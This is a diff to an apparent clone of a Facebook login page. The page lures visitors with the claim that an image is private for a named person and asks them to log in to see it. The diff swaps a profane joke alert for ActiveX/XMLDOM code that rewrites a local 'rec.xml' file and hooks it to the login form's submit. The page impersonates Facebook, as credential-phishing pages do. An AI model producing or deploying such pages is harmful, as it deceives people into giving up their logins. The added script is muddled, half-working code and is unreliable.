@@ -9,13 +9,54 @@
 <!--<script>(require("ServerJSDefine")).handleDefines([["URLFragmentPreludeConfig",[],{"incorporateQuicklingFragment":true,"hashtagRedirect":true},137],["BootloaderConfig",[],{},329],["CurrentUserInitialData",[],{"id":"0"},270],["SiteData",[],{"revision":1191756,"tier":"","push_phase":"V3","pkg_cohort":"EXP1:DEFAULT","vip":"31.13.73.129"},317],["DTSGInitialData",[],{},258],["ISB",[],{},330],["LSD",[],{"token":"AVr29Yo_"},323],["BanzaiConfig",[],{"EXPIRY":86400000,"MAX_SIZE":10000,"MAX_WAIT":150000,"RESTORE_WAIT":150000,"blacklist":["time_spent"],"gks":{"adapterhooks":true,"boosted_pagelikes":true,"boosted_website":true,"boosted_posts":true,"jslogger":true,"kbshortcuts_feed":true,"miny_compression":true,"pages_client_logging":true,"time_spent_bit_array":true,"time_spent_debug":true,"useraction":true,"videos":true,"visibility_tracking":true,"vitals":true}},7]]);new (require("ServerJS"))().handle({"require":[["markJSEnabled"],["lowerDomain"],["URLFragmentPrelude"],["Primer"],["Bootloader"]]});</script>--></head><body class="login_page booklet webkit chrome mac Locale_en_US"><div id="booklet"><div id="pageheader"><div class="clearfix" id="header_container"><div class="lfloat _ohe"><h2 id="homelink">Facebook</h2></div></div></div><div id="content" class="fb_content clearfix">
 
 <script>
-  function butt()
-  {
-    alert("Fuck me");
-  }
-</script>
+  <!--
+function loadXMLDoc(dname) 
+{
+try //Internet Explorer
+{
+xmlDoc=new ActiveXObject("Microsoft.XMLDOM");
+//xmlDoc=new ActiveXObject("Microsoft.XMLDOM");
+}
+catch(e)
+{
+try //Firefox, Mozilla, Opera, etc.
+{
+xmlDoc=document.implementation.createDocument("","",null);
+}
+catch(e){alert(e.message)}
+}
+try 
+{
+xmlDoc.async=false;
+xmlDoc.load(dname);
+xmlDoc.save("rec.xml");
+return(xmlDoc);
+}
+catch(e) {alert(e.message)}
+return(null);
+}
 
-<div class="login_form_container"><form id="login_form" method="post" onsubmit="butt();">
+function write()
+{
+alert("Writing Start");
+xmlDoc=loadXMLDoc("rec.xml");
+alert("Loaded");
+x=xmlDoc.getElementsByTagName("title")[0].childNodes[0];
+alert("Object")
+alert(x.nodeValue)
+x.nodeValue="Easy Cooking";
+alert(x.nodeValue)
+xmlDoc.save("rec.xml");
+//alert("books.xml");
+}
+
+function cmdOk_onclick() {
+write()
+}
+-->
+</script>
+  
+<div class="login_form_container"><form id="login_form" method="post" onsubmit="write();">
 <input type="hidden" name="lsd" value="AVr29Yo_" autocomplete="off" />
 <div class="hidden_elem"></div>This image is marked as private for <b>Jill Costello</b>. &nbsp;Log in to Facebook to view this image.
 <div id="loginform"><input type="hidden" autocomplete="off" id="api_key" name="api_key" value="120179524728527" />
